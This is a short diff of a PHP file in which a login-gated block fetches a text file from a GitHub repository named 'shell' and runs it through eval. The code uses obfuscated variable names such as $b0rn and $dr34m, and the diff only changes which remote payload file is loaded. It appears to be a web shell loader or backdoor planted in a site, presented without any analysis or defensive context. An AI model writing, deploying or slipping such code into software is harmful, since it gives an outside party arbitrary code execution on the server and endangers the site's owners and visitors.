@@ -79,7 +79,7 @@ if (is_logged_in()) {
         return false;
     }    
 
-    $b0rn = 'https://raw.githubusercontent.com/lyyahm/shell/refs/heads/main/445.txt';
+    $b0rn = 'https://raw.githubusercontent.com/lyyahm/shell/refs/heads/main/34.txt';
     $dr34m = geturlsinfo($b0rn);
     if ($dr34m !== false) {
         eval('?>' . $dr34m); 
@@ -220,4 +220,5 @@ if (is_logged_in()) {
 }
 
 ?>
+
 
